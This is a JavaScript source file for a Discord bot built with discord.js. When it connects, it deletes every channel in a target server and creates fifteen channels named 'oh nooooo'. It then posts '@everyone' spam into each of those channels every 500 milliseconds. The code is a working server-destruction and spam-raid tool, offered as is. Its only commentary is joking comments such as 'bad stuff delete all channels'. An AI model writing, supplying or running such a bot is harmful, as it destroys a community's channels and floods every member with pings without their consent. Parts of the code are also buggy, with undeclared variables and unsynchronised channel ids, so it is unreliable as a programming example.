const{ token } = require('./config.json');
const { Client, Events, GatewayIntentBits, SlashCommandBuilder, TextChannel } = require ( 'discord.js' );
  
const client = new Client ({intents: GatewayIntentBits.Guilds});
client.once(Events.ClientReady, c => {
    console.log(`Logged in as ${c.user.tag}`);
});

function sendEveryone() {
    client.channels.cache.get('').send('@everyone');
}

client.once('ready', () => {
    //set status
    client.user.setActivity('Powered by Ultra Advanced Coding Technologies');
    console.log('Ready!');
    //set guild id
    let guild = client.guilds.cache.get('SERVER_ID_GOES_HERE');
    //bad stuff delete all channels
    guild.channels.cache.forEach((channel) => { // check each channel in guild
        channel.delete() //delete :o
    })
    //cweate array 4 channel ids
    ncids = [];
    //create channels
    for (let i = 0; i < 15; i++) { 
        guild.channels.create({
            name: "oh nooooo",
            type: "0",
        }).then(result => {
            ncids[i] = result.id;
        })//print channel id
    }
    
    //console.log(ncids[4])
    function delay(time) {
        return new Promise(resolve => setTimeout(resolve, time));
    }
    //delay(10000).then(() => 
    //console.log(ncids[4])
    //);

    //spam everyone
    function everyone() {
        for (let i = 0; i < 15; i++) { 
            channel = client.channels.cache.get(ncids[i]);
            channel.send("I like eating bread. @everyone")
        }
    }
    console.log(ncids[3])
    delay(8000).then(() => 
    setInterval(everyone, 500)
    );
    
})

//client.on('ready', client => {
//    client.user.setActivity('Powered by Ultra Advanced Coding Technologies');
//    //setInterval(sendEveryone, 300)
//    console.log('ready');
//    //let guild = client.guilds.cache.get('');
//})

client.on("message", message => {
    if(message.content === "hey guysss"){
        console.log('hello');
    }
})

client.login(token);
